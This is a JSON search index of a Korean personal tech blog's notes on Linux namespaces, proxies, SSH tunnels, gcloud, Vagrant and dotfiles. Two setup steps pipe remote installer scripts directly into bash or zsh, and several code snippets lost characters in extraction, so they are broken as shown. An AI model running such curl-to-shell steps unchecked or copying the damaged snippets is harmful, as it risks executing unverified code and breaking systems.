:\n\n dev_net() : http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L1839\n\n하나의 socket은 반드시 하나의 network namspace에 속한다. \\\nstruct sock : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L301 \\\nhttp://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L306 \\\nstruct sock_common : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L158 \\\nhttp://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L194 \\\n\nrelated function : \n\nsock_net() : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L2162\nsocknetset() : http://lxr.free-electrons.com/source/include/net/sock.h?v=4.0#L2168\n\nsystem에 존재하는 모든 network namspaces를 담는 list가 추가되었다. \\\nhttp://lxr.free-electrons.com/source/include/net/net_namespace.h#L160 \\\nstruct listhead netnamespacelist : http://lxr.free-electrons.com/source/net/core/netnamespace.c?v=4.0#L33 \\\nhttp://lxr.free-electrons.com/source/net/core/net_namespace.c?v=4.0#L34 \n\n해당 list를 traverse 하는 macro도 추가되었다. \\\nforeachnet() : http://lxr.free-electrons.com/source/include/net/net_namespace.h?v=4.0#L276 \\\ninitial network namesapce인 init_net은 loopback device와 모든 physical device, networking table 등을 갖고 있다. \\\nhttp://lxr.free-electrons.com/source/include/net/net_namespace.h?v=4.0#L140 \\\nstruct net initnet : http://lxr.free-electrons.com/source/net/core/netnamespace.c?v=4.0#L36 \\\ninit_net 또한 struct net의 instance이다. \\\n새로 생성되는 각각의 network namespace는 오직 loopback device 만을 가지고 있다. \\\nsocket은 가지고 있지 않다.\n\nCGroup\n\n Reference\n\nhttp://www.toptal.com/linux/separation-anxiety-isolating-your-system-with-linux-namespaces \\\nhttps://blog.jtlebi.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/ \\\nhttp://crosbymichael.com/creating-containers-part-1.html \\\nhttp://www.lizhaozhong.info/archives/tag/namespace \\\nhttp://www.cnblogs.com/blueswu/p/3566307.html \n",
        "tags": []
    },
    {
        "uri": "/content/system/network",
        "title": "network",
        "content": "\nOSI 7 Layers\n\nApplication\nPresentation\nSession\nTransport\nNetwork\nData Link\nPhysical\n\n Virtualization\n\nSDN\n\nSoftware Defined Network\n\n NFV\n\nNetwork Function Virtualization\n\nOverlay and Underlay\n\nVLAN\nGRE : Generic Route Encapsulation\nVXLAN : Virtual Extensible LAN\nFlat\n\nBGP : Border Gateway Protocol\n",
        "tags": []
    },
    {
        "uri": "/content/system/proxy",
        "title": "proxy",
        "content": "\nProxy Auto Config\n대부분의 Browser에서 지원한다.\njavascript syntax를 사용한다.\n\nCLI에서 지원을 잘 안하는것 같다.\n\nlibproxy가 이를 지원하기위해 개발되고 있다.\nhttps://libproxy.github.io/libproxy\n\npacparser를 사용하면 pac으로 부터 URL에 해당되는 Proxy 정보를 가져올 수 있다.\nhttps://github.com/pacparser/pacparser\n\n SSH Proxy\nOpenSSH를 활용하여 간단한 SOCKS proxy를 만들 수 있다.\nhttps://keyolk.github.io/2016/06/30/Open-S-S-H.html\n\nSOCKS proxy를 사용하지 못하는 application에서는 tsocks나 proxychains, sshuttle을 사용한다.\n\nUtilities\ntsocks를 사용하면 SOCKS proxy를 지원하지 않는 application에서도 이를 사용할 수 있게 할 수 있다.\nproxychains를 사용하면 application별로 proxy를 할당해 줄 수 있다.\nsshuttle은 동적인 iptable을 구성하여 ssh proxy를 사용할 수 있도록 도와준다.\nredsocks를 사용하면 좀 더 편하게 SOCKS proxy를 구축할 수 있다.\nsquid 다소 사용이 복잡하지만 여러 상황에서 활용할 수 있다.\n",
        "tags": []
    },
    {
        "uri": "/content/workspace/blog",
        "title": "blog",
        "content": "\nIntro\nBlogging 환경 구성을 위한 정리.\n\nHosting: GitHub Pages\nSite Generator: Hugo\nTheme: Learn\nCommenting: Disqus\nAnalytics: Google Analytics\nEditor: Prose.io\nCI: Travis CI\nGoogle Adsence\n\n GitHub Pages\n\nGitHub Pages을 통해 GitHub에 static site대한 hosting을 받을 수 있다.\n\nUser Page를 만드려면 간단히 \"${USER_NAME}.github.io\"로 repository를 만들고 여기에 static web resource를 담으면 된다.\n\nHugo\n\nJekyll을 많이 쓰는데 Hugo가 redering 속도가 빠르고 보다 간편한것 같다.\n\n Install\n\narch에선 User Repository형태로 제공된다.\n\n$ yaourt -Sy hugo\n\nGenerate Static Web Pages\n\n새로 site를 만들때 file layout을 만들어준다.\n\n$ hugo new site ${SITE_NAME}\n$ ls ${SITE_NAME}\narchetypes  content  data  layouts  static  themes  config.toml\n\n Learn\n\nLearn이 깔끔하게 쓰기 좋아보여 사용한다.\n\nconfig.toml\ntheme = \"hugo-theme-learn\"\n\nDisqus\n\nDisqus를 통해 static site에 comment 기능을 넣을 수 있다.\n\nconfig.toml\ndisqusShortname = \"${DISQUSSHORTNAME}\"\n Google Analytics\n\nGoogle Analytics를 통해 Site 유입 추이 등을 확인할 수 있다.\n\nconfig.toml\ngoogleAnalytics = \"${GOOGLE_ANALYTICS}\"\n\nProse.io\n\nProse.io\n\n Travis CI\n\nTravis CI\n\nGoogle Adsence\n\n Troubleshooting\n\n",
        "tags": []
    },
    {
        "uri": "/content/workspace/gcloud",
        "title": "gcloud",
        "content": "\nIntro\n\n$ curl https://sdk.cloud.google.com | bash\n\nexec -l $SHELL\n\n$ gcloud auth login\n\n GKE\n\n$ gcloud components update kubectl\n\n$ gcloud config set project keyolk\n$ glcoud config set compute/zone asia-east1-a\n\n$ gcloud config set container/cluster keyolk\n\n$ gcloud config list\n\n$ gcloud container clusters create keyolk --num-nodes 2 --machine-type g1-small\n\n$ gcloud compute instances list\n\n$ kubectl run tomcat --image=tomcat\n\n$ gcloud container clusters delete keyolk\n",
        "tags": []
    },
    {
        "uri": "/content/workspace/index",
        "title": "Workspace",
        "content": "\nWorkspace\nOS, Desktop, Terminal, Editor 등 작업환경 설정 관련 정리.\n\n Contents\npersonal: 개인용 환경설정.\noffice: 사무실용 환경설정.\n",
        "tags": []
    },
    {
        "uri": "/content/workspace/office",
        "title": "office",
        "content": "\nIntro\n사무실용 환경 설정에 필요한 Step 정리.\n\nCorporation Firewall에 따른 개인용 Transparent Proxy.\n이종 OS간 Keyboard/Mouse Sharing.\n내부 가상화 환경.\nSSH.\n\n OpenSSH\nRemote Host\n\nConfiguration File을 통해 Remote Host를 관리하면 편하다.\n$ cat ~/.ssh/config\nHost remote1\n  Hostname 1.2.3.4\n  User root\n  IdentityFile remote1\n  ForwardX11 yes\n  ProxyCommand ssh proxy nc %h %p\n위의 예는 SSH를 연결하면서 X11Forward와 Dynamic Proxy 연결을 같이 한다.\n\nIdentityFile을 별도로 만들경우 아래와 같이 사용 가능하다.\n$ ssh -i $IDENTITY_FILE $REMOTE\n\n Proxy\nForward Proxy\n\n$ ssh -N -f -L 0.0.0.0:8080:1.2.3.4:8080 $REMOTE\n\n Backward Proxy\n\n$ ssh -R 0.0.0.0:8080:1.2.3.4:8080 $REMOTE\n\n0.0.0.0에 port를 binding 하려면 아래 설정이 필요하다.\n$ cat /etc/ssh/sshd_config | grep -i gatewayports\nGatewayPorts yes\nDynamic Proxy\n\n$ ssh -D 8080 $REMOTE\n\n X11 Forward\n\n$ ssh -X $REMOTE\n\nXAuth를 Skip한다.\n$ ssh -Y $REMOTE\n\n관련 설정\n$ cat /etc/ssh/sshd_config | grep -i x11\nX11Forwarding yes\nX11DisplayOffset 10\nX11UseLocalHost yes\n\n Redosocks\nCorporation Firewall로 인해 internet으로 가는 pakcet은 모두 Proxy를 거쳐가야한다.\nHTTP proxy를 일일이 등록하는건 힘드므로,\n개인용 Transparent Proxy를 구축한다.\n\npacman -Sy redsocks\n\n vi /etc/redsocks.conf\n\nbase {\n\tlog_debug = off;\n\tlog_info = on;\n\tlog = stderr;\n\tdaemon = on;\n\tredirector = iptables;\n}\n\nredsocks {\n\tlocal_ip = 0.0.0.0;\n\tlocal_port = 10080;\n\n\tip = proxy;\n\tport = 8080;\n\n\ttype = http-relay;\n}\n\nredsocks {\n\tlocal_ip = 0.0.0.0;\n\tlocal_port = 10443;\n\n\tip = proxy;\n\tport = 8080;\n\n  type = http-connect;\n}\n\nsystemctl enable redsocks\n systemctl start redsocks\n\n위와 같이 구성하면 redsocks는 10080/10443으로 오는 packet을\nSOCKS channel을 통해 모두 proxy:8080으로 보내게된다.\n\n!/bin/bash\n\niptables -t nat -N PROXY\niptables -t nat -F PROXY\niptables -t nat -I OUTPUT 1 -j PROXY\niptables -t nat -I PREROUTING 1 -j PROXY\n\nfor network in ip a | grep 'inet ' | grep -v 'inet6' | awk '{print $2}';\ndo\n    sudo iptables -t nat -A PROXY -j RETURN --dest $network -p tcp\ndone\n\niptables -t nat -A PROXY -p tcp --dport 80 -j REDIRECT --to 10080\niptables -t nat -A PROXY -p tcp --dport 443 -j REDIRECT --to 10443\n위와 같이하면 내부 network을 제외,\n외부로 나가는 모든 HTTP/HTTPS packet은 각기 10080/10443을 통해 proxy로 가게된다.\n\n Proxy Auto Config\n내부 System과 외부 System이 혼재되어 있을때 이를 모두 iptable를 통해 proxy 처리하려면 힘들다.\n간단한 작업은 PAC를 통해할 수 있다.\n또한 특정 target과 연동되어있는 System의 경우 Dynamic Proxy를 통해 VPN과같은 효과를 사용해야한다.\n\n아래 10000 port는 target system에 대해 VPN endpoint가 된다.\nssh -N -f -D :10000 target\n\n아래와 같이 URI/IP에 따라 경유되는 channel을 바꿔줄 수 있다.\nGATEWAY_TARGET=\"SOCKS localhost:10000; DIRECT\";\nGATEWAY_PROXY=\"proxy:8080;\"\n\nfunction FindProxyForURL(url, host)\n{\n    if(host==\"127.0.0.1\" || host==\"localhost\") return \"DIRECT\";\n\n    if(host==\"1.2.3.4\") return GATEWAY_TARGET;\n    if(host==\"example-1.org\" || dnsDomainIs(host, \".example-1.org\")) return GATEWAY_TARGET;\n\n    if(host==\"5.6.7.8\") return GATEWAY_PROXY;\n    if(host==\"example-2.org\" || dnsDomainIs(host, \".example-2.org\")) return GATEWAY_PROXY;\n\n    return GATEWAY_PROXY;\n}\n위 pac를 Browser나 NetworkManager의 Proxy설정에 반영하면\nHTTP/HTTPS packetㅇ네 대해서 위에 정의한대로 Routing 시켜준다.\n\nVagrant\n Plugin\n내 경우 보통 아래 plugin들을 사용한다.\n\n$ vagrant plugin install landrush vagrant-cachier vagrant-triggers vagrant-vbguest  vagrant-proxyconf vagrant-ca-certificates\n\nlandrush는 vagrant instance들과 host machine 사이에\nDNS를 구축하는걸 도와준다.\n\n구체적으론 resolveconf와 dnsmasq를 이용한 구성이다.\nArch 등 일부 OS에서는 자동으로 dnsmasq 설치와 설정을 처리해주지 않으므로,\n직접 구성해줘야 한다.\n\nopenresolv 경우,\nvi /etc/resolv.conf.head\nnameserver 127.0.0.1\n\n resolveconf -u\n\n위와 같이 persist한 DNS 설정을 추가할 수 있다.\n\ndnsmasq는,\nvi /etc/dnsmasq.conf\n\n위 설정에 아래 line을 추가하면 .vagrant의 TLD를 +\n10053 port에서 service하는 landrush에 물어보도록 할 수 있다.\nserver=/.vagrant/127.0.0.110053\n\nTrouble Shooting\nFailed to open a session for the virtual machine seconion-standalone.\n\nImplementation of the USB 2.0 controller not found!\n\nBecause the USB 2.0 controller state is part of the saved VM state, the VM cannot be started. To fix this problem, either install the 'Oracle VM VirtualBox Extension Pack' or disable USB 2.0 support in the VM settings (VERRNOTFOUND).\n\nResult Code: NSERRORFAILURE (0x80004005)\nComponent: Console\nInterface: IConsole {8ab7c520-2442-4b66-8d74-4ff1e195d2b6}\n\nconfig.vm.provider \"virtualbox\" do |vb|\n  vb.customize [\"modifyvm\", :id, \"--usb\", \"on\"]\n  vb.customize [\"modifyvm\", :id, \"--usbehci\", \"off\"]\nend\n\nNo usable default provider could be found for your system.\n\nVagrant relies on interactions with 3rd party systems, known as\n\"providers\", to provide Vagrant with resources to run development\nenvironments. Examples are VirtualBox, VMware, Hyper-V.\n\nThe easiest solution to this message is to install VirtualBox, which\nis available for free on all major platforms.\n\nIf you believe you already have a provider available, make sure it\nis properly installed and configured. You can see more details about\nwhy a particular provider isn't working by forcing usage with\nvagrant up --provider=PROVIDER, which should give you a more specific\nerror message for that particular provider.\n\n여러가지 이유가 있겠지만\n지원하지 않는 version의 driver만 설치되어 있을 경우에도 발생할 수 있다.\ndriver의 version을 낮추거나 vagrant의 version을 높여도 되지만.\n다소 naive한 해결 방법이 존재한다.\n\n$ cd /opt/vagrant/embedded/gems/gems/vagrant-1.8.4/plugins/providers/virtualbox/driver/\n$ ls\nbase.rb  version4_0.rb  version42.rb  version5_0.rb\nmeta.rb  version4_1.rb  version4_3.rb\n$ cp version5_0.rb version5_1.rb\n\n$ cat version5_1.rb| grep 50\n      class Version_5_0 < Base\n          @logger = Log4r::Logger.new(\"vagrant::provider::virtualbox_5_0\")\n\n$ cat meta.rb| grep -A 7 'driver_map  '\n          driver_map   = {\n            \"4.0\" = Version_4_0,\n            \"4.1\" = Version_4_1,\n            \"4.2\" = Version_4_2,\n            \"4.3\" = Version_4_3,\n            \"5.0\" = Version_5_0,\n          }\n\n$ cat ../plugin.rb| grep -A 8 'module Driver'\n    module Driver\n      autoload :Meta, File.expandpath(\"../driver/meta\", _FILE__)\n      autoload :Version4_0, File.expandpath(\"../driver/version4_0\", _FILE__)\n      autoload :Version4_1, File.expandpath(\"../driver/version4_1\", _FILE__)\n      autoload :Version4_2, File.expandpath(\"../driver/version4_2\", _FILE__)\n      autoload :Version4_3, File.expandpath(\"../driver/version4_3\", _FILE__)\n      autoload :Version5_0, File.expandpath(\"../driver/version5_0\", _FILE__)\n    end\n위에서 보듯이 3개 file을 수정해주면 정상적으로 실행 가능하다.\n\n Synergy\n이런저런 이유로 Windows와 Linux Machine을 같이 써야한다.\nSynergy를 사용하여 이종 OS간 Keyboard 및 Mouse, Clipboard를 공유할 수 있다.\n\n아래 URI에서 가입 및 구매가 필요하다.\n\nhttps://symless.com/synergy/\n\nConfiguration\n pacman -Sy synergy\n\n기본 Monitor 배치 구성을 먼저 한다.\n$ vi /etc/synergy.conf\n\nsection: screens\n  keyolk-arch:\n\tkeyolk-windows:\nend\n\nsection: links\n\tkeyolk-arch:\n\t\tright = keyolk-windows\n\tkeyolk-windows:\n\t\tleft  = keyolk-arch\nend\n\nSynergy는 Client/Server 구조를 이뤄져있다.\n실제 Keyboard와 Mouse가 연결되어 있는 쪽이 Server가 된다.\n\nServer 구동.\n$ systemctl enable synergys\n$ systemctl start synergys\n\nClient에서 synergy를 설치 후 Server로 접속하면 된다.\n\nChrome\n HSTS\nPrivate Network에서 Corporation Certificate를 사용하는 경우\nHSTS로 인해 정상적으로 Browsing을 못할 수 있다.\nChrome의 경우 borwser에서 해당 domain의 HSTS 정보를 삭제해야한다.\n\nchrome://net-internals/#hsts\n\n",
        "tags": []
    },
    {
        "uri": "/content/workspace/personal",
        "title": "personal",
        "content": "\nIntro\n\n개인 Desktop Environment 구축하기 위해 필요한 Step 정리.\n현재 사용 중인 System 기준\n\nH/W : Chrombook Pixel2 LS\nOS : ApricityOS\nDesktop : Gnome3\nTerminal : zsh + tmux + nvim + powerline + fzf\n\nTerminal 관련 상세 설정은 여기에서 확인할 수 있다.\n\n Chromebook\nenable developer mode\nenable SeaBIOS\n\nApricityOS\n Install\nhttps://apricityos.com/download\n\nKernel\nhttps://github.com/raphael/linux-samus\n\n Package\n!/bin/bash\ngit submodule update --init --recursive\n\nsudo pacman -Syy zsh tmux neovim git xclip meld python-pip\nsudo pacman -Syy python-neovim python2-neovim\nsudo pacman -Syy fzf thesilversearcher\nsudo pacman -Syy docker vagrant\n\n install python virtualenv\nsudo pacman -Syy pythob-virtualenv python2-virtualenv\n\ninstall gvm to manage golang version and workspace\nzsh < <(curl -s -S -L https://raw.githubusercontent.com/moovweb/gvm/master/binscripts/gvm-installer)\n\n install docker-machine\nsudo sh -c \"curl -L https://github.com/docker/machine/releases/download/v0.7.0/docker-machine-uname -s-uname -m  /usr/local/bin/docker-machine && \\\nchmod +x /usr/local/bin/docker-machine\"\n\ninstall docker-compose\nsudo sh -c \"curl -L https://github.com/docker/compose/releases/download/1.7.1/docker-compose-uname -s-uname -m  /usr/local/bin/docker-compose; chmod +x /usr/local/bin/docker-compose\"\n\n install nautilus-compare to intergrate meld with nautilus\ngit clone https://aur.archlinux.org/nautilus-compare.git ~/workspace/build/aur/nautilus-compare\ncd ~/workspace/build/aur/nautilus-compare\nmakepkg -si --noconfirm\n\nGnome\nGnome 환경 설정 관련 정리.\n\n Workspace\nDual Monitor를 쓸때 Secondary Monitor가 Workspace와 동기화되게 하려면 아래와 gnome setting이 수정되어야 한다.\n$ gsettings set org.gnome.shell.overrides workspaces-only-on-primary false\n\nAlt tab이 현재 workspace 내에 존재하는 application 사이에서만 switching되게 하려면,\n$ gsettings set org.gnome.shell.app-switcher current-workspace-only true\n\nInputMethod\n한글 입력기론 ibus-hangul을 쓴다.\n입력기 관련 설정은 아래에서 찾을 수 있다.\n\n$ cat /etc/environment\n\nThis file is parsed by pam_env module\n\nSyntax: simple \"KEY=VAL\" pairs on separate lines\n\nBROWSER=/usr/bin/google-chrome-stable\nEDITOR=nvim\nGTKIMMODULE=ibus\nXMODIFIERS=@im=ibus\nQTIMMODULE=ibus\n\nUniversal Access에서 Screen Keyboard를 Disable해도\n계속 나타나는 버그가 있다.\n\n아래 dbus service에서 관련 항목에 Exec들을 comment해버리면 일단 해결된다.\n$ vi /usr/share/dbus-1/services/org.gnome.Caribou.Antler.service\n$ vi /usr/share/dbus-1/services/org.gnome.Caribou.Daemon.service\n\nWindow Manager\nGnome 3.22가 되면서 wayland가 deafult로 설정된다. +\n아직 wayland랑 안붙는 utility가 많으므로 아래와 같이 다시 xorg를 쓰도록 한다.\n\n$ vi /etc/gdm/custom.conf\n\ndaemon 설정에 아래 line을 넣자.\n\nWaylandEnable=false\n\n Desktop\nFreeDesktopGroup 과 관련된 표준이 존재한다.\n기본 Directory가 거슬릴때가 있는데 아래와 같이 수정할 수 있다.\n\n$ xdg-user-dirs-update --set DOWNLOAD $HOME/desktop/download\n$ xdg-user-dirs-update --set PUBLICSHARE $HOME/desktop/public\n$ xdg-user-dirs-update --set VIDEOS $HOME/desktop/videos\n$ xdg-user-dirs-update --set TEMPLATES $HOME/desktop/templates\n$ xdg-user-dirs-update --set PICTURES $HOME/desktop/pictures\n$ xdg-user-dirs-update --set DOCUMENTS $HOME/desktop/documents\n$ xdg-user-dirs-update --set MUSIC $HOME/desktop/music\n\nZSH\nZSH 관련 설정 정리.\n\n Plugin Manager\nantigeen을 plugin managemnt tool로 사용한다.\n아래 bundler들을 사용한다.\nset dotfiles path\nexport DOTFILES=$HOME/.dotfiles\n\n Use antigen as plugin manager\nsource $DOTFILES/zsh/antigen.zsh\n\nantigen use oh-my-zsh\nantigen bundle zsh-users/zsh-syntax-highlighting\nantigen bundle zsh-users/zsh-history-substring-search\nantigen bundle command-not-found\nantigen bundle colorize\nantigen bundle colored-man-pages\nantigen bundle vagrant\nantigen bundle docker\nantigen bundle python\nantigen bundle git\nantigen bundle aws\nantigen bundle golang\nantigen bundle python\nantigen bundle pip\n\nantigen apply\n\nSource all *.zsh under .dotfiles\nfor configfile ($DOTFILES/**/*.zsh) source $configfile\n\n Put here private configuration\nif [[ -a ~/.localrc ]]\nthen\n  source ~/.localrc\nfi\n\nPrevet nested tmux session\nif [[ -z \"$TMUX\" ]]; then\n  exec tmux\nfi\n\n Set GVM for Golang\n[[ -s \"/home/keyolk/.gvm/scripts/gvm\" ]] && source \"/home/keyolk/.gvm/scripts/gvm\"\n\nSet default golang\ngvm use go1.7.3 & /dev/null\n\n Set default golang project\ngvm pkgset use container & /dev/null\n\n Use fzf for fuzzy search\nsource /usr/share/fzf/completion.zsh\nsource /usr/share/fzf/key-bindings.zsh\n\nexport PATH=$PATH:/home/keyolk/.gem/ruby/2.3.0/bin\nexport PATH=$PATH:/home/keyolk/tool\n\nsource <(kubectl completion zsh)\n\nsource ~/workspace/cnct/k2.sh\n\nhistory file\nHISTFILE=~/.histfile\nHISTSIZE=10000\nSAVEHIST=10000\n\n for better directory navigation\nsetopt AUTO_PUSHD\nsetopt PUSHD_MINUS\nsetopt CDABLE_VARS\nzstyle ':completion::directory-stack' list-colors '=(#b) #([0-9]#)( *)==95=38;5;12'\n\nUse vim mode\nbindkey -v\nexport KEYTIMEOUT=1\n\n Use powerline\nsource /usr/share/zsh/site-contrib/powerline.zsh\n\nbinding for home/end key\n for system\nbindkey '\\e[1~' beginning-of-line\nbindkey '\\e[4~' end-of-line\nbindkey '\\e[7~' beginning-of-line\nbindkey '\\e[8~' end-of-line\nbindkey '\\eOH' beginning-of-line\nbindkey '\\eOF' end-of-line\nbindkey '\\e[H' beginning-of-line\nbindkey '\\e[F' end-of-line\n\nfor vi-mode\nbindkey -M vicmd '\\e[1~' beginning-of-line\nbindkey -M vicmd '\\e[4~' end-of-line\n\n binding for delete key\nfor system\nbindkey '\\e[3~' delete-char\n\n for vi-mode\nbindkey -M vicmd '\\e[3~' delete-char\n\nbinding for history-substirng-search\n for system\nzmodload zsh/terminfo\nbindkey \"$terminfo[kcuu1]\" history-substring-search-up\nbindkey \"$terminfo[kcud1]\" history-substring-search-down\n\nfor vi-mode\nbindkey -M vicmd 'k' history-substring-search-up\nbindkey -M vicmd 'j' history-substring-search-down\n\nalias ls='ls --color -h --group-directories-first'\n\n TMUX\nTo prevent ESC holding on vi\nset -s escape-time 0\n\n Change prefix key\nset -g prefix C-a\nunbind C-b\nbind C-a send-prefix\n\nSet mouse\nset -g mouse on\n\n act like vim\nsetw -g mode-keys vi\n\nSet the terminal type so colors get rendered correctly\nset -g default-terminal \"screen-256color\"\n\nset -g default-shell \"/usr/bin/zsh\"\nset -g default-command \"zsh\"\nset -g renumber-windows on\n\n Powerline\nsource /usr/share/tmux/powerline.conf\n\nKey bindings\n ctrl-r: Reload tmux config\nbind r source-file ~/.tmux.conf \\; display 'Config reloaded'\n\nsync pane\nbind y set-window-option synchronize-panes\n\n window naviation\nbind-key space next-window\nbind-key bspace previous-window\n\nlayout\nbind-key enter next-layout\n\n Ctrl-[hjkl]:\nbind h select-pane -L\nbind j select-pane -D\nbind k select-pane -U\nbind l select-pane -R\n\nbind -n C-h run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys C-h) || tmux select-pane -L\"\nbind -n C-j run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys C-j) || tmux select-pane -D\"\nbind -n C-k run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys C-k) || tmux select-pane -U\"\nbind -n C-l run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys C-l) || tmux select-pane -R\"\n\nalt-[hjkl]\nbind M-h resize-pane -L 5\nbind M-j resize-pane -D 5\nbind M-k resize-pane -U 5\nbind M-l resize-pane -R 5\n\nbind -n M-h run \"(tmux display-message -p '{panecurrentcommand}' | grep -iq vim && tmux send-keys M-h) || tmux resize-pane -L 5\"\nbind -n M-j run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys M-j) || tmux resize-pane -D 5\"\nbind -n M-k run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys M-k) || tmux resize-pane -U 5\"\nbind -n M-l run \"(tmux display-message -p '#{panecurrentcommand}' | grep -iq vim && tmux send-keys M-l) || tmux resize-pane -R 5\"\n\nWindow Split\nbind v split-window -h -c \"{panecurrentpath}\"\nbind s split-window -v -c \"#{panecurrentpath}\"\nbind q confirm killp\n\nMake Home and End keys work in copy mode\nunbind-key -t vi-copy Home\nbind-key -t vi-copy Home start-of-line\nunbind-key -t vi-copy End\nbind-key -t vi-copy End end-of-line\n\n Plugins\nset -g @plugin 'tmux-plugins/tpm'\nset -g @plugin 'tmux-plugins/tmux-sensible'\nset -g @plugin 'christoomey/vim-tmux-navigator'\nrun '~/.tmux/plugins/tpm/tpm'\n\nNVIM\nNVim 설정 정리.\n\n Key Binding\nnvim 에서 Ctrl+[hH] 동작은 terminal 예약키와 겹쳐서 key binding이 안될 수 있다.\n\n아래와 같이 terminal 정보 수정이 필요하다.\n$ infocmp $TERM | sed 's/kbs=^[hH]/kbs=\\\\177/'  ~/$TERM.ti\n$ tic ~/$TERM.ti\n$ rm ~/$TERM.ti\n\nTroubleshooting\n Powerline\ngnome 3.22 update 이후 powerlien character가 밀리는 현상이 있다.\n\n아래와 같이 문제가되는 문자를 바꿔준다.\n\npowerline.json\n\"time\": {\n\"before\": \"◴ \"\n\"before\": \" \"\n},\n",
        "tags": [
            "terminal",
            "gnome"
        ]
    },
    {
        "uri": "/content/workspace/vi",
        "title": "vi",
        "content": "\nfiletype\nsyntax\nomnifunc\n\nhttps://medium.com/@schtoeffel/you-don-t-need-more-than-one-cursor-in-vim-2c44117d51db\n\nmulti cursor : / cgn .\n\neasy align : ga\n\nsurround : cs ds ysiw yss\n\n",
        "tags": []
    }
]